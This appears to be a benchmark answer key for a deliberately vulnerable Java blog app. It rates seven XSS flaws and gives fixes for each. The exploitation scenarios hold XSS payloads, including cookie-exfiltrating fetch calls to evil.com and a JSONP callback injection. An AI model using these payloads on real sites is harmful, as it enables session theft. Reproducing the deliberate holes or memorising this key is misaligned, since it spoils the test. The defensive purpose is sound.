# Security Companion Document: App.java

## Language Exclusion Note: C and C++

C and C++ are excluded from the XSS vulnerability class because they are not typical web templating languages. While C and C++ can serve HTTP responses (e.g., via libmicrohttpd or cpp-httplib), they do not have standard HTML templating engines or web frameworks that produce dynamic HTML in the way that Python (Flask/Jinja2), Java (Spring Boot/Thymeleaf), Go (html/template), Rust (Actix-web), and JavaScript (Express.js) do. XSS vulnerabilities arise from the interaction between server-side code and HTML rendering in a browser, which is a pattern native to higher-level web frameworks rather than systems programming languages.

---

## Vulnerability: Reflected XSS via Category Filter Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L95

### Description
The index method appends the `category` query parameter directly into the HTML response using `page.append("<p>Filtering by category: <strong>").append(category).append("</strong></p>")`. The category value from `@RequestParam` is embedded without any HTML escaping.

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:8084/?category=<script>alert(document.cookie)</script>` and shares it with a victim. When the victim clicks the link, the script executes in their browser context, potentially stealing session cookies.

### Remediation Guidance
Use Spring's `HtmlUtils.htmlEscape()` to escape the parameter:
```java
page.append("<p>Filtering by category: <strong>").append(HtmlUtils.htmlEscape(category)).append("</strong></p>");
```

### Complexity Rationale
This is rated Obvious because the query parameter flows directly from the request into HTML output via StringBuilder append with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct reflection of a request parameter into HTML via string concatenation is a standard pattern that SAST tools reliably detect.

---

## Vulnerability: Stored XSS via Post Title and Content on View Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L129-L134

### Description
The viewPost method renders the post title, author, and content directly into HTML without escaping. The title is rendered via `page.append("<h1>").append(post.title).append("</h1>")`, and the content via `page.append(...).append(post.content).append("</div>")`. All fields are stored from user input without sanitization.

### Exploitation Scenario
An attacker creates a post with title `<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">`. When any user views the post, the onerror handler fires and exfiltrates their cookies. The content field can contain full HTML including script tags.

### Remediation Guidance
Escape all user-supplied fields before rendering:
```java
page.append("<h1>").append(HtmlUtils.htmlEscape(post.title)).append("</h1>");
page.append("<div>").append(HtmlUtils.htmlEscape(post.content)).append("</div>");
```

### Complexity Rationale
This is rated Obvious because user-supplied data stored in the post object is directly appended to HTML output with no escaping.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from stored data to HTML output via StringBuilder is a straightforward pattern for SAST tools.

---

## Vulnerability: Stored XSS via Comment Author and Body

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L139-L141

### Description
The viewPost method renders comment author and body fields directly into HTML without escaping. The comment data is stored from form submission in the `addComment` method and later rendered via `page.append("<strong>").append(c.author)` and `page.append("<p>").append(c.body)`. The data flows through storage in the `BlogPost.comments` list before being rendered.

### Exploitation Scenario
An attacker submits a comment with author `<script>alert('XSS')</script>` or body containing malicious HTML. When any user views the post with comments, the injected script executes in their browser.

### Remediation Guidance
Escape comment fields before rendering:
```java
page.append("<strong>").append(HtmlUtils.htmlEscape(c.author)).append("</strong>");
page.append("<p>").append(HtmlUtils.htmlEscape(c.body)).append("</p>");
```

### Complexity Rationale
This is rated Moderate because the data flows from the addComment POST handler through in-memory storage in the BlogPost object before being rendered in the viewPost GET handler, requiring a reviewer to trace the data flow across two methods.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the taint from form parameters through the Comment object storage and into the rendering loop in a separate method.

---

## Vulnerability: Reflected XSS via Search Query with Inconsistent Escaping

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L215-L231

### Description
The search method reflects the query parameter `q` in multiple locations with inconsistent escaping. The query is embedded unescaped in the search input value attribute (line 217), the results heading (line 223), and the search highlighting logic (line 228-229). Notably, the content preview on line 231 uses `HtmlUtils.htmlEscape()`, creating a false sense of security while the query itself and the highlighted title remain unescaped.

### Exploitation Scenario
An attacker crafts `http://localhost:8084/search?q="><script>alert(1)</script>` which breaks out of the input value attribute. The query is also reflected in the results heading and the highlighting replacement, providing multiple injection points.

### Remediation Guidance
Escape the query parameter consistently in all output contexts:
```java
String safeQ = HtmlUtils.htmlEscape(q);
page.append("<input type='text' name='q' value=\"").append(safeQ).append("\">");
page.append("<h2>Results for: ").append(safeQ).append("</h2>");
```

### Complexity Rationale
This is rated Nuanced because the content preview is properly escaped with `HtmlUtils.htmlEscape()` on line 204, creating an inconsistent pattern where some outputs are escaped and others are not. A reviewer seeing the escape call may assume all outputs are protected.

### Detection Difficulty Rationale
This is rated Likely_Missed because the presence of `HtmlUtils.htmlEscape()` in the same method may cause SAST tools to reduce severity, and the multiple injection points across different HTML contexts (attribute, body, and highlighting replacement) require comprehensive taint analysis.

---

## Vulnerability: Stored XSS via Profile Fields with Attribute Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L257-L262

### Description
The profilePage method renders user profile fields (displayName, bio, website, avatarUrl) directly into HTML without escaping. The website field is injected into an href attribute, and the avatarUrl field is injected into an img src attribute. The data flows from form submission through cookie-based user lookup before rendering.

### Exploitation Scenario
An attacker registers with website `javascript:alert(document.cookie)` to create a clickjacking link, or sets avatarUrl to `x" onerror="fetch('http://evil.com/?c='+document.cookie)` to inject an event handler into the img tag. The bio field can contain arbitrary HTML including script tags.

### Remediation Guidance
Escape all profile fields and validate URLs:
```java
page.append("<h1>").append(HtmlUtils.htmlEscape(profile.displayName)).append("</h1>");
page.append("<div><strong>Bio:</strong> ").append(HtmlUtils.htmlEscape(profile.bio)).append("</div>");
```
Validate website and avatar URLs to ensure they use http/https schemes.

### Complexity Rationale
This is rated Moderate because the vulnerability spans multiple fields and output contexts (HTML body, href attribute, img src attribute), and the data flow involves cookie-based authentication to retrieve stored profile data.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace data from form submission through in-memory storage, cookie-based retrieval, and into multiple HTML output contexts including attribute injection.

---

## Vulnerability: Reflected XSS via Error Message Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L308

### Description
The errorPage method concatenates the `msg` query parameter directly into HTML using string concatenation: `HEADER + "<h1>Error</h1><div style='color:red;'><p>" + msg + "</p></div>"`. The message is taken from `@RequestParam` with no escaping.

### Exploitation Scenario
An attacker crafts `http://localhost:8084/error?msg=<script>alert('XSS')</script>` and shares the link. The script executes when the victim visits the URL.

### Remediation Guidance
Escape the error message:
```java
return HEADER + "<h1>Error</h1><div style='color:red;'><p>" + HtmlUtils.htmlEscape(msg) + "</p></div>";
```

### Complexity Rationale
This is rated Obvious because the query parameter is directly concatenated into HTML output with no processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because direct string concatenation of a request parameter into HTML is a textbook reflected XSS pattern.

---

## Vulnerability: JSONP Callback Injection in API Endpoint

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L329-L333

### Description
The apiPosts endpoint supports a `callback` query parameter for JSONP responses. The callback value is concatenated directly into the response via `callback + "(" + json + ")"` and served with `Content-Type: application/javascript`. No validation is performed on the callback parameter.

### Exploitation Scenario
An attacker crafts `http://localhost:8084/api/posts?callback=alert(document.cookie)//` which produces `alert(document.cookie)//(...)`. When loaded via a `<script>` tag, this executes arbitrary JavaScript. The `application/javascript` content type ensures the browser treats the response as executable code.

### Remediation Guidance
Validate the callback parameter against a strict pattern:
```java
if (callback != null && callback.matches("[a-zA-Z_$][a-zA-Z0-9_$]*")) {
    String jsonp = callback + "(" + json + ")";
```
Or remove JSONP support and use CORS headers instead.

### Complexity Rationale
This is rated Nuanced because JSONP callback injection is a less commonly recognized XSS vector that operates in a JavaScript execution context rather than an HTML context, requiring specialized knowledge to identify.

### Detection Difficulty Rationale
This is rated Likely_Missed because most SAST tools focus on HTML-context XSS and may not flag JSONP callback injection, especially when the response uses `application/javascript` content type.
